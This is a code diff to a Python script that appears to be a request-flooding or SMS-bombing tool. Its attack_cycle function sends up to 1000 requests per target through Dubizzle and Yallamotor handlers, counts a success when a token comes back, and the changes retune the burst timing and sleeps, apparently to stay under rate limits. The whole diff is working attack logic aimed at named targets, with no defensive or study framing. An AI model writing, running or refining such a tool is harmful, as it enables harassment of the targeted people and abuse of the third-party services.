@@ -75,13 +75,13 @@ def generate_target_stats_ui(stats_list) -> Table:
 
 
 def dubizzle_sendRequest(target, dubizzle_stats):
-    req = dubizzle_handler(target)
+    req = dubizzle_handler()
     try :
-        if "Token" in req.text :
+        if "token" in req.text :
             dubizzle_stats.suc += 1
         else :
             dubizzle_stats.fail += 1
-            error_log.append(f"Dubizzle: {req.text}\t Target: {target}")
+            error_log.append(f"Dubizzle: {req.text}\t Target: {target}\t Target: {req.status_code}")
             time.sleep(600)
     except Exception as e :
         dubizzle_stats.fail += 1
@@ -113,17 +113,19 @@ def attack_cycle(target,live, stats_list) :
     while count < 1000 :
         burst = 0
         while burst < 5 :
-            yallamotor_stats = yallamotor_sendRequest(target, yallamotor_stats)
-            count += 1
-            burst += 1
-            live.update(generate_target_stats_ui(stats_list))
-            time.sleep(60)
-        while burst <5:
             dubizzle_stats = dubizzle_sendRequest(target, dubizzle_stats)
             count += 1
             burst += 1
             live.update(generate_target_stats_ui(stats_list))
             time.sleep(30)
+        burst = 0
+        time.sleep(300)
+        while burst <5:
+            yallamotor_stats = yallamotor_sendRequest(target, yallamotor_stats)
+            count += 1
+            burst += 1
+            live.update(generate_target_stats_ui(stats_list))
+            time.sleep(60)
 
 def main():
     targets = target_list.split(",")
